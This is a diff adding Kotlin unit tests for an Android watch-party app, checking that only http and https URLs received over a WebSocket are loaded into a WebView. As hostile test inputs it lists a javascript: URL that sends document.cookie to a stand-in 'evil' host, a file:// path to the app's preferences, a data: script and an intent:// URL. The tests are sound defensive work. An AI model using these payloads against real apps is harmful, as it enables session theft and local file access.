@@ -150,4 +150,57 @@ class SyncPolicyTest {
     @Test fun unknown_guest_url_reloads_so_a_fresh_guest_still_lands_on_the_video() {
         assertTrue(SyncPolicy.shouldReload("https://www.hotstar.com/x", "", 0L, 1_000_000L))
     }
+
+    // ── isNavigable ───────────────────────────────────────────────────────────
+    // videoUrl comes off an unauthenticated WebSocket. Handing a `javascript:` URL to
+    // WebView.loadUrl executes it inside the signed-in streaming page, not as navigation.
+
+    @Test fun only_http_and_https_are_navigable() {
+        assertTrue(SyncPolicy.isNavigable("https://www.hotstar.com/in/shows/x/1260/watch"))
+        assertTrue(SyncPolicy.isNavigable("http://localhost:8080/room/abc"))
+        assertTrue(SyncPolicy.isNavigable("HTTPS://WWW.HOTSTAR.COM/x"))
+        assertTrue(SyncPolicy.isNavigable("  https://www.hotstar.com/x  "))
+    }
+
+    @Test fun hostile_and_local_schemes_are_not_navigable() {
+        assertFalse(SyncPolicy.isNavigable("javascript:fetch('https://evil/'+document.cookie)"))
+        assertFalse(SyncPolicy.isNavigable("file:///data/data/com.fluffles.watchparty/shared_prefs/hwp_prefs.xml"))
+        assertFalse(SyncPolicy.isNavigable("data:text/html,<script>alert(1)</script>"))
+        assertFalse(SyncPolicy.isNavigable("intent://evil#Intent;scheme=https;end"))
+        assertFalse(SyncPolicy.isNavigable("content://com.android.providers/x"))
+        assertFalse(SyncPolicy.isNavigable("about:blank"))
+        assertFalse(SyncPolicy.isNavigable(""))
+        assertFalse(SyncPolicy.isNavigable("   "))
+        assertFalse(SyncPolicy.isNavigable("not a url at all"))
+        assertFalse(SyncPolicy.isNavigable("www.hotstar.com/x")) // relative — no scheme
+    }
+
+    @Test fun shouldReload_refuses_every_non_navigable_host_url() {
+        val guest = "https://www.hotstar.com/in/shows/x/1260/watch"
+        for (hostile in listOf(
+            "javascript:fetch('https://evil/'+document.cookie)",
+            "file:///data/data/com.fluffles.watchparty/shared_prefs/hwp_prefs.xml",
+            "data:text/html,<script>alert(1)</script>",
+            "intent://evil#Intent;scheme=https;end",
+            "content://com.android.providers/x",
+            "about:blank",
+            "not a url at all",
+        )) {
+            assertFalse(
+                "shouldReload must refuse $hostile",
+                SyncPolicy.shouldReload(hostile, guest, 0L, 1_000_000L),
+            )
+        }
+    }
+
+    @Test fun shouldReload_still_navigates_for_a_genuine_https_content_change() {
+        assertTrue(
+            SyncPolicy.shouldReload(
+                hostUrl = "https://www.hotstar.com/in/shows/x/1261/watch",
+                guestUrl = "https://www.hotstar.com/in/shows/x/1260/watch",
+                lastReloadAtMs = 0L,
+                nowMs = 1_000_000L,
+            )
+        )
+    }
 }
